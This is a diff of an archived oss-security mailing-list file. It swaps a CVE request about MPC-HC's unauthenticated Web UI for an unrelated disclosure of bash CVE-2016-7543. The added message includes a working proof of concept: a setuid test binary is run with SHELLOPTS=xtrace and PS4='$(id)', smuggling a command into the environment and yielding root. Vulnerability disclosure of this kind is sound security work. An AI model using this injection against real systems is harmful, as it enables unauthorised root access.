@@ -1,30 +1,34 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/02/10/3
-Message-ID: <CALfBxESL4MhUEZ_sg+CPBCmsJki3QVHDAhvkTSJ4niR3KeqKww@mail.gmail.com>
-Date: Wed, 10 Feb 2016 14:41:16 +0100
-From: Andreas Lindh <addelindh@...il.com>
-To: oss-security@...ts.openwall.com, cve-assign@...re.org
-Subject: CVE request for Media Player Classic
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/09/26/9
+Message-ID: <20160926174325.74454qfavcdb1uyo@webmail.alunos.dcc.fc.up.pt>
+Date: Mon, 26 Sep 2016 17:43:25 +0200
+From: up201407890@...nos.dcc.fc.up.pt
+To: oss-security@...ts.openwall.com
+Subject: CVE-2016-7543 -- bash SHELLOPTS+PS4
 Content-Type: text/plain; charset=utf-8
 
-Hi list, CVE-assign,
+The recent bash 4.4 patched an old attack vector regarding
+specially crafted SHELLOPTS+PS4 environment variables
+against bogus setuid binaries using system()/popen().
 
-On the 14th of November 2015, Media Player Classic - Home Cinema (MPC-HC)
-disabled the preview function in the MPC-HC Web UI in version 1.7.10, as
-this function could be abused to steal private images from the machine
-running MPC-HC with the Wen UI enabled.
+https://lists.gnu.org/archive/html/bug-bash/2016-09/msg00018.html
 
-See https://mpc-hc.org/changelog/ for the MPC-HC changelog, and
-http://haxx.ml/post/125666329821/abusing-the-mpc-hc-webui-to-steal-private-pictures
-for more details on the issue and practical exploitation of it.
+"nn. Shells running as root no longer inherit PS4 from the environment,
+closing a security hole involving PS4 expansion performing command
+substitution."
 
-The main issue here is that the Web UI does not have any authentication,
-something which (besides the already mentioned issue) enables an attacker
-on the same network to start media files on the MPC-HC running on the
-affect machine.
+# gcc -xc - -otest <<< 'int main() { setuid(0); system("/bin/date"); }'
+# chmod 4755 ./test
+# ls -l ./test
+-rwsr-xr-x. 1 root root 8549 Sep 10 18:06 ./test
+# exit
+$ env -i SHELLOPTS=xtrace PS4='$(id)' ./test
+uid=0(root)
+Sat Sep 10 18:06:36 WET 2016
 
-Could a CVE be assigned for this please?
+Sorry Tavis :P
 
-Cheers,
-Andreas
+----------------------------------------------------------------
+This message was sent using IMP, the Internet Messaging Program.
+
 
